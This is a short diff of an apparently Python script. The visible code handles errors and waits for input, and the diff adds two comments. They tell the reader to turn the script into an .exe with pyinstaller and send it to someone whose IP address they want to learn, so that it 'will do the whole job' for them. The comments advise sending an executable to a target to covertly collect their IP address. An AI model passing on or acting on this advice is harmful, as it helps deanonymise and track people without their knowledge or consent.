@@ -38,3 +38,5 @@ else:
         # If any error occurs, then this message will appear
         print("An unknown error has occurred!")
 input()
+# You can then convert this script into an .exe program by using pyinstaller (Search for it if you dont know how) and then send the program to whoever you want to identify his IP address and it will do the whole job for you
+# (Success rate is NOT 100%)
